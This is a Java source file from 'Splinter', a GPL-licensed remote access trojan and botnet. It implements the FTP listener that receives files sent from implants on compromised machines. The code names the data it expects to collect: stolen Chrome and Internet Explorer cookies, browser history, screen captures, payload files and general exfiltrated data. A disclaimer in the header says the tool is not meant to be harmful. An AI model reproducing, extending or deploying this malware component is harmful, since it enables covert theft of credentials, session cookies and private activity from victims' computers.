/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant.FTP;

import Implant.Driver;
import java.awt.Color;
import java.io.File;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import javax.swing.JLabel;

public class FTP_ServerSocket extends Thread
  implements Runnable
{
  String strMyClassName = "FTP_ServerSocket";

  FTP_Thread_Receiver receiverThread = null;

  public static String FILE_TYPE_ORDINARY = "FILE_TYPE_ORDINARY";
  public static String FILE_TYPE_COOKIES_CHROME = "FILE_TYPE_COOKIES_CHROME";
  public static String FILE_TYPE_COOKIES_INTERNET_EXPLORER = "FILE_TYPE_COOKIES_IE";
  public static String FILE_TYPE_BROWSER_HISTORY_INTERNET_EXPLORER = "FILE_TYPE_BROWSER_HIST_IE";
  public static String FILE_TYPE_BROWSER_HISTORY_CHROME = "FILE_TYPE_BROWSER_HIST_CHROME";
  public static String FILE_TYPE_SCREEN_CAPTURES = "FILE_TYPE_SCREEN_CAPTURES";
  public static String FILE_TYPE_ORBITER_PAYLOAD = "FILE_TYPE_ORBITER_PAYLOAD";
  public static String FILE_TYPE_DATA_EXFIL = "DATA_EXFIL";

  public boolean i_am_implant_daemon = false;
  public boolean i_am_controller_daemon = true;
  public static int PORT = 21;

  public InetAddress localhost = null;
  public static ServerSocket svrSocket = null;
  public String serverAddr = "";
  public static final int maxFileReadSize_Bytes = 4096;
  public static String FTP_Server_Address = "";

  Socket sktClient = null;

  public static volatile boolean continueRun = true;
  public static volatile boolean FTP_ServerSocket_Is_Open = false;

  public static JLabel jlblToIndicateStatus = null;

  public boolean dismissClosedSocketError = false;

  public FTP_ServerSocket(boolean i_am_implant_receiver, boolean i_am_controller_receiver, int prt, JLabel jlblToIndicateStats)
  {
    this.i_am_implant_daemon = i_am_implant_receiver;
    this.i_am_controller_daemon = i_am_controller_receiver;
    PORT = prt;
    jlblToIndicateStatus = jlblToIndicateStats;
  }

  public void run()
  {
    try
    {
      if ((this.i_am_implant_daemon == this.i_am_controller_daemon) || (PORT > 65534) || (PORT < 1) || (Driver.fleFTP_DropBoxDirectory == null) || (!Driver.fleFTP_DropBoxDirectory.exists()) || (!Driver.fleFTP_DropBoxDirectory.isDirectory()) || ((this.i_am_controller_daemon) && (jlblToIndicateStatus == null)))
      {
        FTP_ServerSocket_Is_Open = false;
        continueRun = false;

        if (this.i_am_controller_daemon)
        {
          Driver.jop_Error("Invalid parameters passed in.  Unable to initiate FTP Server", "Can Not Run FTP Server");
        }

        Driver.sop("Invalid parameters passed in.  Unable to initiate FTP Server");
      }
      else
      {
        continueRun = true;

        svrSocket = new ServerSocket(PORT);

        this.localhost = InetAddress.getLocalHost();

        Driver.sop("FTP ServerSocket initialized.  Listening on Port: " + PORT);

        FTP_ServerSocket_Is_Open = true;

        if (jlblToIndicateStatus != null)
        {
          jlblToIndicateStatus.setText(""+PORT);

          jlblToIndicateStatus.setBackground(Color.green.darker());
          jlblToIndicateStatus.setForeground(Color.white);
        }

      }

      String success = "\n* * * * * FTP ServerSocket Established at " + Driver.getTimeStamp_Without_Date() + " * * * * *\n" + 
        "Server HostName: " + this.localhost.getHostName() + "\n" + 
        "Server IP: " + this.localhost.getHostAddress() + "\n" + 
        "Listening for Files on Port: " + PORT;

      FTP_Server_Address = this.localhost.getHostAddress();

      Driver.sop(success);

      Driver.jop_Message(success, "ServerSocket Established");

      String enabled = "ENABLED";
      if (!Driver.autoAcceptFTP_Files)
      {
        enabled = "DISABLED";
      }

      Driver.jop_Warning("NOTE: Auto Receiving of FTP files is currently " + enabled + "\nPlease remember to modify this option if applicable...", "FTP Auto-Accept Files is " + enabled);

      while (continueRun)
      {
        this.sktClient = null;

        this.sktClient = svrSocket.accept();

        if (!continueRun)
        {
          try
          {
            this.sktClient.close();
          }
          catch (Exception localException1)
          {
          }

        }

        this.receiverThread = new FTP_Thread_Receiver(this.i_am_implant_daemon, this.i_am_controller_daemon, this.sktClient);
        this.receiverThread.start();

        Driver.alConnectedFTPClients.add(this.receiverThread);
      }

    }
    catch (SocketException se)
    {
      if (this.dismissClosedSocketError)
      {
        Driver.sop("FTP ServerSocket has been closed.");
      }
      else
      {
        Driver.jop_Error("FTP ServerSocket is unable to bind to port " + PORT + ".\nPerhaps this port is occupied or has recently closed.                                \n\nPlease try a different port", "ServerSocket NOT ESTABLISHED - Unable to bind to port" + PORT);
        Driver.sop("Unable to bind to port " + PORT + ". FTP ServerSocket is Closed. You must try another port in order to continue");
      }

    }
    catch (Exception e)
    {
      Driver.eop("run", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    Driver.sop("HALTING FTP SERVER RECEIVER!!!");
    try
    {
      svrSocket.close();
    }
    catch (Exception localException2) {
    }
    continueRun = false;
    FTP_ServerSocket_Is_Open = false;

    if (jlblToIndicateStatus != null)
    {
      jlblToIndicateStatus.setText("CLOSED");

      jlblToIndicateStatus.setBackground(Color.red);
      jlblToIndicateStatus.setForeground(Color.white);
    }
  }
}